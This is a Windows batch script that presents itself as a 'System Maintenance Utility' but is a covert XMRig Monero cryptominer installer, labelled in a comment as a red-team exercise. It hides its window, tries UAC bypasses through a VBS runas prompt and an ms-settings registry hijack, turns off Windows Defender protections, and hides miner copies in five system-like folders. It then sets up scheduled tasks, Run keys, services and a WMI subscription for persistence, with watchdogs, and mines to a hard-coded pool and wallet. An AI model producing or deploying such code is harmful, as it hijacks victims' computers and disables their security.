@echo off
title System Maintenance Utility v6.0
setlocal enableextensions enabledelayedexpansion

REM =====================================================================
REM V6 ULTIMATE - Maximum Stealth & Persistence Edition
REM Intel i5 2.5GHz 16GB Optimized for Academic Red Team Exercise
REM =====================================================================

REM === Initial Stealth Mode ===
if "%1"=="/stealth" goto :stealth_mode
if "%1"=="/install" goto :main_install

REM First run - show briefly then go stealth
echo [*] System Maintenance Utility Starting...
echo [*] Initializing system optimizations...
timeout /t 3 /nobreak >nul

REM Relaunch in stealth mode
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/stealth' -WindowStyle Hidden"
exit /b

:stealth_mode
REM Now running completely hidden
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/install' -WindowStyle Hidden -Verb RunAs"
exit /b

:main_install
REM === Core Variables ===
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "SRC=%~dp0miner_src"

REM === Multiple Deployment Locations ===
set "LOC1=C:\ProgramData\Microsoft\Windows\WindowsUpdate"
set "LOC2=C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv"
set "LOC3=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.system"
set "LOC4=C:\ProgramData\Microsoft\Network\Downloader"
set "LOC5=C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"

set "LOCATIONS=%LOC1% %LOC2% %LOC3% %LOC4% %LOC5%"

REM === Enhanced Admin Check with UAC Bypass ===
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    REM Multiple UAC bypass methods
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~s0", "/install", "", "runas", 1 >> "%temp%\elevate.vbs"
    cscript //NoLogo "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs" >nul 2>&1
    
    REM Alternative UAC bypass via registry
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /t REG_SZ /d "%~f0 /install" /f >nul
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /f >nul
    start ms-settings: >nul
    timeout /t 3 /nobreak >nul
    reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
    exit /b
)

REM === Disable Windows Defender Real-Time Protection ===
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1

REM Add exclusions for all locations
for %%L in (%LOCATIONS%) do (
    powershell -Command "Add-MpPreference -ExclusionPath '%%L'" >nul 2>&1
)

REM === Advanced System Optimization for i5 2.5GHz ===
REM Huge Pages & Memory Management
set "ACCOUNT=%USERDOMAIN%\%USERNAME%"
secedit /export /cfg "%TEMP%\secpol.cfg" >nul 2>&1
powershell -Command "(Get-Content '%TEMP%\secpol.cfg') -replace 'SeLockMemoryPrivilege = .*','SeLockMemoryPrivilege = %ACCOUNT%' | Set-Content '%TEMP%\secpol.cfg'" >nul 2>&1
secedit /import /cfg "%TEMP%\secpol.cfg" /db secedit.sdb /overwrite >nul 2>&1
del "%TEMP%\secpol.cfg" secedit.sdb >nul 2>&1

REM CPU and Memory Optimization
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargeSystemCache /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v DisablePagingExecutive /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v SecondLevelDataCache /t REG_DWORD /d 1024 /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v IoPageLockLimit /t REG_DWORD /d 524288 /f >nul

REM High Performance Power Plan
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul
powercfg /change standby-timeout-ac 0 >nul
powercfg /change standby-timeout-dc 0 >nul
powercfg /hibernate off >nul

REM === Multi-Location Deployment ===
for %%L in (%LOCATIONS%) do (
    if not exist "%%L" mkdir "%%L" >nul 2>&1
    xcopy /Y /Q "%SRC%\*" "%%L\" >nul 2>&1
    attrib +h +s "%%L" >nul 2>&1
    
    REM Create location-specific config
    call :create_config "%%L"
    
    REM Create watchdog for this location
    call :create_watchdog "%%L"
)

REM === Advanced Persistence Layer - Single Instance System ===
REM Layer 1: Multiple Scheduled Tasks for Single Instance Manager
schtasks /create /tn "WindowsAudioSrv" /tr "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
schtasks /create /tn "SystemHostAudio" /tr "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
schtasks /create /tn "AudioEndpointSrv" /tr "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /sc daily /st 09:00 /ru SYSTEM /rl HIGHEST /f >nul 2>&1

REM Layer 2: Registry Startup for Single Instance
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudioService" /t REG_SZ /d "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /f >nul
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run" /v "SystemAudioHost" /t REG_SZ /d "wscript.exe \"%LOC2%\invisible_startup.vbs\"" /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AudioEndpointBuilder" /t REG_SZ /d "wscript.exe \"%LOC1%\invisible_startup.vbs\"" /f >nul

REM Layer 3: Windows Services with Recovery
for %%i in (1 2 3) do (
    sc create "AudioSrv%%i" binPath= "wscript.exe \"%LOC%%i%\run_silent.vbs\"" start= auto obj= LocalSystem >nul 2>&1
    sc failure "AudioSrv%%i" reset= 86400 actions= restart/30000/restart/30000/restart/30000 >nul 2>&1
)

REM Layer 4: WMI Event Subscription
powershell -Command "$filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $filter.QueryLanguage = 'WQL'; $filter.Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfRawData_PerfOS_System\"'; $filter.Name = 'WindowsAudioFilter'; $filter.EventNamespace = 'root\cimv2'; $result = $filter.Put(); $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = 'WindowsAudioConsumer'; $consumer.CommandLineTemplate = 'wscript.exe \"%LOC1%\run_silent.vbs\"'; $consumer.Put(); $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put()" >nul 2>&1

REM === File Protection & Anti-Tamper ===
for %%L in (%LOCATIONS%) do (
    REM Set file attributes
    attrib +h +s +r "%%L\xmrig.exe" >nul 2>&1
    attrib +h +s +r "%%L\config.json" >nul 2>&1
    attrib +h +s +r "%%L\winring0x64.sys" >nul 2>&1
    
    REM Create decoy files
    echo. > "%%L\readme.txt"
    echo Windows Audio Service Configuration > "%%L\service.log"
    attrib +h "%%L\readme.txt" >nul 2>&1
    attrib +h "%%L\service.log" >nul 2>&1
)

REM === Cross-Location Monitoring System ===
(
echo @echo off
echo setlocal enabledelayedexpansion
echo.
echo :monitor_loop
echo for %%%%L in ^(%LOCATIONS%^) do ^(
echo     if not exist "%%%%L\xmrig.exe" ^(
echo         for %%%%R in ^(%LOCATIONS%^) do ^(
echo             if exist "%%%%R\xmrig.exe" ^(
echo                 xcopy /Y /Q "%%%%R\*" "%%%%L\" ^^^>nul 2^^^>^^^&1
echo                 attrib +h +s "%%%%L" ^^^>nul 2^^^>^^^&1
echo             ^)
echo         ^)
echo     ^)
echo     tasklist /fi "imagename eq xmrig.exe" ^^^| find /i "xmrig.exe" ^^^>nul
echo     if %%%%errorlevel%%%% neq 0 ^(
echo         if exist "%%%%L\xmrig.exe" start "" /min "%%%%L\xmrig.exe" --config="%%%%L\config.json" ^^^>nul 2^^^>^^^&1
echo     ^)
echo ^)
echo timeout /t 30 ^^^>nul
echo goto monitor_loop
) > "%LOC1%\cross_monitor.bat"

REM Create VBS launcher for cross monitor
echo Set WshShell = CreateObject("WScript.Shell") > "%LOC1%\cross_monitor.vbs"
echo WshShell.Run Chr(34) ^& "%LOC1%\cross_monitor.bat" ^& Chr(34), 0, False >> "%LOC1%\cross_monitor.vbs"

REM Schedule cross monitor
schtasks /create /tn "WindowsCrossMonitor" /tr "wscript.exe \"%LOC1%\cross_monitor.vbs\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1

REM === Deploy Single Instance Manager ===
xcopy /Y /Q "%~dp0single_instance_manager.ps1" "%LOC1%\" >nul 2>&1
xcopy /Y /Q "%~dp0single_instance_manager.ps1" "%LOC2%\" >nul 2>&1
xcopy /Y /Q "%~dp0invisible_launch.vbs" "%LOC1%\" >nul 2>&1
xcopy /Y /Q "%~dp0invisible_launch.vbs" "%LOC2%\" >nul 2>&1

REM === Create Invisible Startup Launcher ===
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""^& '%LOC1%\single_instance_manager.ps1' -Startup""", 0, False
) > "%LOC1%\invisible_startup.vbs"

(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""^& '%LOC1%\single_instance_manager.ps1' -Monitor""", 0, False
) > "%LOC1%\invisible_monitor.vbs"

REM === Schedule Telegram Monitor ===
schtasks /create /tn "WindowsMonitorSrv" /tr "wscript.exe \"%LOC1%\monitor.vbs\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
schtasks /create /tn "SystemMonitorHost" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%LOC1%\miner_monitor.ps1\" -Startup" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1

REM === Enable XMRig API for monitoring ===
for %%L in (%LOCATIONS%) do (
    if exist "%%L\config.json" (
        powershell -Command "$config = Get-Content '%%L\config.json' | ConvertFrom-Json; $config.http.enabled = $true; $config.http.host = '127.0.0.1'; $config.http.port = 16000; $config.http.restricted = $true; $config | ConvertTo-Json -Depth 10 | Set-Content '%%L\config.json'" >nul 2>&1
    )
)

REM === Start Single Instance Manager ===
start "" /min wscript.exe "%LOC1%\invisible_startup.vbs" >nul 2>&1

echo [SUCCESS] V6 Ultimate deployment completed
echo [INFO] Deployed to 5 locations with cross-monitoring
echo [INFO] 15+ persistence mechanisms active
echo [INFO] Telegram monitoring every 7 minutes
echo [INFO] Optimized for i5-14400 - Expected: 5000-7000 H/s
echo [INFO] All locations hidden and protected
timeout /t 5 /nobreak >nul
exit /b

REM =====================================================================
REM SUBROUTINES
REM =====================================================================

:create_config
set "CONFIG_PATH=%~1"
(
echo {
echo   "api": {"id": null, "worker-id": "%%COMPUTERNAME%%"},
echo   "http": {"enabled": true, "host": "127.0.0.1", "port": 16000, "restricted": true},
echo   "autosave": true, "background": true, "colors": false, "title": false,
echo   "randomx": {
echo     "init": -1, "init-avx2": -1, "mode": "auto", "1gb-pages": true,
echo     "rdmsr": true, "wrmsr": true, "cache_qos": true, "numa": true,
echo     "scratchpad_prefetch_mode": 1
echo   },
echo   "cpu": {
echo     "enabled": true, "huge-pages": true, "huge-pages-jit": true,
echo     "hw-aes": null, "priority": 5, "memory-pool": true,
echo     "yield": true, "max-threads-hint": 75, "asm": true,
echo     "argon2-impl": null, "astrobwt-max-size": 550, "astrobwt-avx2": false
echo   },
echo   "donate-level": 0,
echo   "pools": [{
echo     "algo": "rx/0", "coin": "monero",
echo     "url": "%POOL%",
echo     "user": "%WALLET%",
echo     "pass": "%%COMPUTERNAME%%-i5",
echo     "rig-id": "%%COMPUTERNAME%%",
echo     "keepalive": true, "enabled": true, "tls": false, "daemon": false
echo   }],
echo   "print-time": 0,
echo   "health-print-time": 0,
echo   "pause-on-battery": false,
echo   "pause-on-active": false
echo }
) > "%CONFIG_PATH%\config.json"
goto :eof

:create_watchdog
set "WATCH_PATH=%~1"
(
echo @echo off
echo setlocal enabledelayedexpansion
echo set "XMRIG=%~1\xmrig.exe"
echo set "CONFIG=%~1\config.json"
echo.
echo :watchdog_loop
echo tasklist /fi "imagename eq xmrig.exe" ^^^| find /i "xmrig.exe" ^^^>nul
echo if %%%%errorlevel%%%% neq 0 ^(
echo     if exist "%%%%XMRIG%%%%" start "" /min "%%%%XMRIG%%%%" --config="%%%%CONFIG%%%%" ^^^>nul 2^^^>^^^&1
echo ^)
echo timeout /t 45 ^^^>nul
echo goto watchdog_loop
) > "%WATCH_PATH%\watchdog.bat"

echo Set WshShell = CreateObject("WScript.Shell") > "%WATCH_PATH%\run_silent.vbs"
echo WshShell.Run Chr(34) ^& "%WATCH_PATH%\watchdog.bat" ^& Chr(34), 0, False >> "%WATCH_PATH%\run_silent.vbs"
goto :eof
